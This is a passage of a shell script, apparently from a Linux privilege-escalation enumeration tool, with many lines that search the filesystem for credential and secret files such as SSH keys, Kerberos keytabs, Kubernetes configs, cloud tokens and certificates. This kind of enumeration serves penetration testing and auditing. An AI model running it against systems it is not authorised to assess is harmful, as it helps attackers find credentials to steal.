"^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E ".*\.tfstate$|.*\.tf$" | sort | uniq | head -n 70)
  1214	  PSTORAGE_RACOON=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "racoon\.conf$|psk\.txt$" | sort | uniq | head -n 70)
  1215	  PSTORAGE_KUBERNETES=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_BIN\n$FIND_DIR_OPT\n$FIND_DIR_CDROM\n$FIND_DIR_MEDIA\n$FIND_DIR_SBIN\n$FIND_DIR_ETC\n$FIND_DIR_SNAP\n$FIND_DIR_SRV\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "kubeconfig$|bootstrap-kubeconfig$|kubelet-kubeconfig$|kubelet\.conf$|psk\.txt$|\.kube.*$|kubelet$|kube-proxy$|kubernetes$" | sort | uniq | head -n 70)
  1216	  PSTORAGE_VNC=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_BIN\n$FIND_DIR_OPT\n$FIND_DIR_CDROM\n$FIND_DIR_MEDIA\n$FIND_DIR_SBIN\n$FIND_DIR_ETC\n$FIND_DIR_SNAP\n$FIND_DIR_SRV\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -v -E '/mime/' | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "\.vnc$|.*vnc.*\.c.*nf.*$|.*vnc.*\.ini$|.*vnc.*\.txt$|.*vnc.*\.xml$" | sort | uniq | head -n 70)
  1217	  PSTORAGE_LDAP=$(echo -e "$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_BIN\n$FIND_DIR_OPT\n$FIND_DIR_CDROM\n$FIND_DIR_MEDIA\n$FIND_DIR_SBIN\n$FIND_DIR_ETC\n$FIND_DIR_SNAP\n$FIND_DIR_SRV\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "ldap$" | sort | uniq | head -n 70)
  1218	  PSTORAGE_LOG4SHELL=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}media|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}lib64|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}lib32|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}lib|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "log4j-core.*\.jar$" | sort | uniq | head -n 70)
  1219	  PSTORAGE_OPENVPN=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E ".*\.ovpn$" | sort | uniq | head -n 70)
  1220	  PSTORAGE_SSH=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "id_dsa.*$|id_rsa.*$|known_hosts$|authorized_hosts$|authorized_keys$" | sort | uniq | head -n 70)
  1221	  PSTORAGE_CERTSB4=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -v -E '/usr/share/|/usr/local/lib/|/usr/lib.*' | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E ".*\.pem$|.*\.cer$|.*\.crt$" | sort | uniq | head -n 70)
  1222	  PSTORAGE_CERTSBIN=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -v -E '^/usr/share/|/usr/local/lib/|/usr/lib/.*|/usr/share/|/usr/local/lib/|/usr/lib/.*' | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E ".*\.csr$|.*\.der$" | sort | uniq | head -n 70)
  1223	  PSTORAGE_CERTSCLIENT=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -v -E '/usr/share/|/usr/local/lib/|/usr/lib/.*' | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E ".*\.pfx$|.*\.p12$" | sort | uniq | head -n 70)
  1224	  PSTORAGE_SSH_AGENTS=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -v -E '.dll' | grep -E "^${ROOT_FOLDER}tmp" | grep -E "agent.*$" | sort | uniq | head -n 70)
  1225	  PSTORAGE_SSH_CONFIG=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}usr|^$GREPHOMESEARCH" | grep -E "ssh.*config$" | sort | uniq | head -n 70)
  1226	  PSTORAGE_SNYK=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "snyk\.json$|snyk\.config\.json$" | sort | uniq | head -n 70)
  1227	  PSTORAGE_CLOUD_CREDENTIALS=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_BIN\n$FIND_DIR_OPT\n$FIND_DIR_CDROM\n$FIND_DIR_MEDIA\n$FIND_DIR_SBIN\n$FIND_DIR_ETC\n$FIND_DIR_SNAP\n$FIND_DIR_SRV\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "credentials\.db$|legacy_credentials\.db$|adc\.json$|\.boto$|\.credentials\.json$|firebase-tools\.json$|access_tokens\.db$|access_tokens\.json$|accessTokens\.json$|gcloud$|legacy_credentials$|azureProfile\.json$|TokenCache\.dat$|AzureRMContext\.json$|ErrorRecords$|TokenCache\.dat$|\.bluemix$|doctl$" | sort | uniq | head -n 70)
  1228	  PSTORAGE_ROAD_RECON=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "\.roadtools_auth$" | sort | uniq | head -n 70)
  1229	  PSTORAGE_FREEIPA=$(echo -e "$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_BIN\n$FIND_DIR_OPT\n$FIND_DIR_CDROM\n$FIND_DIR_MEDIA\n$FIND_DIR_SBIN\n$FIND_DIR_ETC\n$FIND_DIR_SNAP\n$FIND_DIR_SRV\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "ipa$|dirsrv$" | sort | uniq | head -n 70)
  1230	  PSTORAGE_KERBEROS=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "krb5\.conf$|.*\.keytab$|\.k5login$|krb5cc_.*$|kadm5\.acl$|secrets\.ldb$|\.secrets\.mkey$|sssd\.conf$" | sort | uniq | head -n 70)
  1231	  PSTORAGE_KIBANA=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "kibana\.y.*ml$" | sort | uniq | head -n 70)
  1232	  PSTORAGE_GRAFANA=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "grafana\.ini$" | sort | uniq | head -n 70)
  1233	  PSTORAGE_KNOCKD=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E '/etc/init.d/' | grep -E "^${ROOT_FOLDER}etc" | grep -E ".*knockd.*$" | sort | uniq | head -n 70)
  1234	  PSTORAGE_LOGSTASH=$(echo -e "$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_BIN\n$FIND_DIR_OPT\n$FIND_DIR_CDROM\n$FIND_DIR_MEDIA\n$FIND_DIR_SBIN\n$FIND_DIR_ETC\n$FIND_DIR_SNAP\n$FIND_DIR_SRV\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "logstash$" | sort | uniq | head -n 70)
